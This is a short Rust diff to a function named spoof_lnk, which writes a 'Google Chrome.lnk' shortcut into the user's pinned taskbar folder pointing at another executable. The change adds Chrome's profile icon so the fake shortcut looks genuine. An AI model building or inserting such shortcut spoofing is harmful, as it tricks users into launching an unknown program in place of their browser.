@@ -13,6 +13,9 @@ pub fn spoof_lnk(username: &str) -> Result<(), Box<dyn std::error::Error>> {
 
     let mut link = ShellLink::new(exe_path_str)?;
     link.set_working_dir(Some(start_in_str.to_string()));
+
+    link.set_icon_location(Some(format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Google Profile.ico", username)));
+
     let shortcut_path = PathBuf::from(format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk", username));
     link.create_lnk(&shortcut_path)?;
 
